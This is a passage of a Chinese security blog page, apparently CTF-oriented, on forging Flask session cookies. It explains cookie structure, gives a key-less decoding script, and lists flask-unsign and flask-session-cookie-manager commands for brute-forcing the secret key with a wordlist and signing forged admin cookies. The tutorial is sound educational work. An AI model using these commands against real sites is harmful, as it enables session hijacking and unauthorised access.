@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/acvtar.jpg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/acvtar.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/acvtar.jpg">
+  <link rel="mask-icon" href="/images/acvtar.jpg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/6.0.17/fancybox/fancybox.css" integrity="sha256-yE0aDX61mjiw8FoDuGetFttFoGJMeWsU/iYEFOfpMhA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"baozongwi.xyz","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.23.2","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="剖析代码？">
+<meta property="og:type" content="article">
+<meta property="og:title" content="flask中的session伪造">
+<meta property="og:url" content="https://baozongwi.xyz/posts/320a5814.html">
+<meta property="og:site_name" content="baozongwi:H@cking Th3 Fu1ure">
+<meta property="og:description" content="剖析代码？">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202410/flask%E7%9A%84session%E4%BC%AA%E9%80%A0/QQ%E6%88%AA%E5%9B%BE20241022161535.png">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202410/flask%E7%9A%84session%E4%BC%AA%E9%80%A0/QQ%E6%88%AA%E5%9B%BE20241022165221.png">
+<meta property="article:published_time" content="2024-10-22T07:30:50.000Z">
+<meta property="article:modified_time" content="2025-07-13T10:31:48.069Z">
+<meta property="article:author" content="baozongwi">
+<meta property="article:tag" content="flask">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://baozongwi.xyz/images/achieve/202410/flask%E7%9A%84session%E4%BC%AA%E9%80%A0/QQ%E6%88%AA%E5%9B%BE20241022161535.png">
+
+
+<link rel="canonical" href="https://baozongwi.xyz/posts/320a5814.html">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://baozongwi.xyz/posts/320a5814.html","path":"posts/320a5814.html","title":"flask中的session伪造"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>flask中的session伪造 | baozongwi:H@cking Th3 Fu1ure</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/6.0.17/fancybox/fancybox.umd.js" integrity="sha256-32A/chfN6JgQkwK/QFZY8siVcOZj3LUt1vSKIcDvshM=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js" defer></script>
+
+  <script src="/js/third-party/pace.js" defer></script>
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="baozongwi:H@cking Th3 Fu1ure" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">baozongwi:H@cking Th3 Fu1ure</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>links</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="Searching..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-%E8%AF%B4%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="nav-number">1.</span> <span class="nav-text">0x01 说在前面</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-question"><span class="nav-number">2.</span> <span class="nav-text">0x02 question</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%93%E6%9E%84"><span class="nav-number">2.1.</span> <span class="nav-text">结构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E5%AF%86%E4%BB%A3%E7%A0%81"><span class="nav-number">2.2.</span> <span class="nav-text">解密代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flask-unsign"><span class="nav-number">2.3.</span> <span class="nav-text">flask-unsign</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flask-session-cookie-manager"><span class="nav-number">2.4.</span> <span class="nav-text">flask-session-cookie-manager</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#demo"><span class="nav-number">2.5.</span> <span class="nav-text">demo</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#demo1"><span class="nav-number">2.5.1.</span> <span class="nav-text">demo1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web4"><span class="nav-number">2.5.2.</span> <span class="nav-text">[CISCN2019 华东南赛区]Web4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HFCTF-2021-Final-easyflask"><span class="nav-number">2.5.3.</span> <span class="nav-text">[HFCTF 2021 Final]easyflask</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HCTF-2018-admin"><span class="nav-number">2.5.4.</span> <span class="nav-text">[HCTF 2018]admin</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-%E5%B0%8F%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">0x03 小结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="baozongwi"
+      src="/images/acvtar.jpg">
+  <p class="site-author-name" itemprop="name">baozongwi</p>
+  <div class="site-description" itemprop="description">天地不仁，以万物为刍狗</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">202</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/baozongwi" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;baozongwi" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:baozongwi@qq.com" title="E-Mail → mailto:baozongwi@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+<ul>
+  <li><a href="/"><i class="fa fa-home"></i> home</a></li>
+  <li><a href="/archives/"><i class="fa fa-archive"></i> archives</a></li>
+  <li><a href="/tags/"><i class="fa fa-tags"></i> tags</a></li>
+  <li><a href="/about/"><i class="fa fa-user"></i> about</a></li>
+  <li><a href="/links/"><i class="fa fa-link"></i> links</a></li>
+</ul>
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://baozongwi.xyz/posts/320a5814.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/acvtar.jpg">
+      <meta itemprop="name" content="baozongwi">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="baozongwi:H@cking Th3 Fu1ure">
+      <meta itemprop="description" content="天地不仁，以万物为刍狗">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="flask中的session伪造 | baozongwi:H@cking Th3 Fu1ure">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          flask中的session伪造
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2024-10-22 15:30:50" itemprop="dateCreated datePublished" datetime="2024-10-22T15:30:50+08:00">2024-10-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2025-07-13 18:31:48" itemprop="dateModified" datetime="2025-07-13T18:31:48+08:00">2025-07-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/talk/" itemprop="url" rel="index"><span itemprop="name">talk</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Word count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Word count in article: </span>
+      <span>23k</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>39 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="0x01-说在前面"><a href="#0x01-说在前面" class="headerlink" title="0x01 说在前面"></a>0x01 说在前面</h1><p>在一般的情况下，网站都会做一个简答的身份验证，而flask当中自然也有，这种就是我们常见的<code>session</code>，<code>session</code>是什么，可以看这个文章</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://baozongwi.xyz/2024/09/11/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x02-question"><a href="#0x02-question" class="headerlink" title="0x02 question"></a>0x02 question</h1><p>现在网上进行session伪造的很少有不需要<code>key</code>的几乎没有，所以这里推荐一个工具叫做<code>flask-unsign</code>，还有就是大家经常使用的脚本，不过我们先看一下结构</p>
+<h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><p>先随便生成一个session</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJsb2NhbGUiOiJlbiJ9-ZSDIwA-v5-mHM9ITAx5lbFhwa3jNnWTIYY</span><br></pre></td></tr></table></figure>
+
+<p>Flask Session 的组成结构主要由三部分构成，第一部分为 Session Data ，即会话数据。第二部分为 Timestamp ，即时间戳。第三部分为 Cryptographic Hash ，即加密哈希。如下图</p>
+<p><img src="/../images/achieve/202410/flask%E7%9A%84session%E4%BC%AA%E9%80%A0/QQ%E6%88%AA%E5%9B%BE20241022161535.png" alt="1"></p>
+<p>下面的结果是看<strong>P牛</strong>的博客知道的(他有代码)</p>
+<ol>
+<li>json.dumps 将对象转换成json字符串，作为数据</li>
+<li>如果数据压缩后长度更短，则用zlib库进行压缩</li>
+<li>将数据用base64编码</li>
+<li>通过hmac算法计算数据的签名，将签名附在数据后，用“.”分割</li>
+</ol>
+<p>签名只能防篡改不能防止被读取，所以我们只要有key就可以伪造<code>cookie</code></p>
+<h2 id="解密代码"><a href="#解密代码" class="headerlink" title="解密代码"></a>解密代码</h2><p>我们上面已经知道了逻辑，那么来分析一个脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decryption</span>(<span class="params">payload</span>):</span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b&#x27;.&#x27;</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not base64 decode the payload because of &#x27;</span></span><br><span class="line">                        <span class="string">&#x27;an exception&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not zlib decompress the payload before &#x27;</span></span><br><span class="line">                            <span class="string">&#x27;decoding the payload&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(decryption(<span class="string">&quot;eyJ1c2VybmFtZSI6eyIgYiI6IlozVmxjM1E9In19.XyZ3Vw.OcD3-l1yOcq8vlg8g4Ww3FxrhVs&quot;</span>.encode()))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>一步步来首先，用<code>.</code>给<code>session</code>分开，然后看看是否是压缩过的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">decompress = <span class="literal">False</span></span><br><span class="line">   <span class="keyword">if</span> payload.startswith(<span class="string">b&#x27;.&#x27;</span>):</span><br><span class="line">       payload = payload[<span class="number">1</span>:]</span><br><span class="line">       decompress = <span class="literal">True</span></span><br></pre></td></tr></table></figure>
+
+<p>如果是<code>.</code>开头那需要解压，那么我们是导入了用来处理用于安全地签名和解签名数据的<code>itsdangerous</code>中的<code>base64_decode</code>来进行会话数据的处理</p>
+<p>测了是否是压缩数据之后就用这个函数进行数据处理然后再看是否需要进行解压，看懂代码的师傅已经发现我们只处理了session的第一段，所以这里是不需要密钥的，就可以看到解密数据，只不过解密的话不好搞</p>
+<h2 id="flask-unsign"><a href="#flask-unsign" class="headerlink" title="flask-unsign"></a>flask-unsign</h2><p>安装直接可以利用pip库进行安装</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install flask-unsign</span><br></pre></td></tr></table></figure>
+
+<p>然后就可以进行具体的使用了，说一下常用的命令吧</p>
+<p><strong>解码 Cookie</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --decode --cookie &#x27;eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>暴力破解</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie &#x27;&lt;cookie&gt;&#x27; --no-literal-eval</span><br><span class="line"></span><br><span class="line">flask-unsign --unsign --cookie &#x27;&lt;SessionCookieStructure&gt;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>签名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --sign --cookie &quot;&#123;&#x27;name&#x27;: &#x27;admin&#x27;&#125;&quot; --secret &#x27;SCFmkpovdDVCJPO21cvcds&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用旧版本进行签名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --sign --cookie &quot;&#123;&#x27;logged_in&#x27;: True&#125;&quot; --secret &#x27;CHANGEME&#x27; --legacy</span><br></pre></td></tr></table></figure>
+
+<h2 id="flask-session-cookie-manager"><a href="#flask-session-cookie-manager" class="headerlink" title="flask-session-cookie-manager"></a>flask-session-cookie-manager</h2><p>这个项目之前我经常用，不过他不能够爆破所以后面就都用的<code>unsign</code>了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/noraj/flask-session-cookie-manager</span><br></pre></td></tr></table></figure>
+
+<p>基本的命令</p>
+<p><strong>Encode</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python&#123;2,3&#125; flask_session_cookie_manager&#123;2,3&#125;.py encode -s &#x27;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&#x27; -t &#x27;&#123;&quot;number&quot;:&quot;326410031505&quot;,&quot;username&quot;:&quot;admin&quot;&#125;&#x27;</span><br><span class="line">eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw</span><br></pre></td></tr></table></figure>
+
+<p><strong>Decode With secret key:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python&#123;2,3&#125; flask_session_cookie_manager&#123;2,3&#125;.py decode -c &#x27;eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw&#x27; -s &#x27;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&#x27;</span><br><span class="line">&#123;u&#x27;username&#x27;: &#x27;admin&#x27;, u&#x27;number&#x27;: &#x27;326410031505&#x27;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Without secret key (less pretty output):</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python&#123;2,3&#125; flask_session_cookie_manager&#123;2,3&#125;.py decode -c &#x27;eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw&#x27;</span><br><span class="line">&#123;&quot;number&quot;:&#123;&quot; b&quot;:&quot;MzI2NDEwMDMxNTA1&quot;&#125;,&quot;username&quot;:&#123;&quot; b&quot;:&quot;YWRtaW4=&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>s</code>是密钥，刚才我们知道了无<code>key</code>的解密代码，这里我们剖析一下代码，看看生成逻辑学习一下，</p>
+<p>先看<strong>Python2</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="string">&quot;&quot;&quot; Flask Session 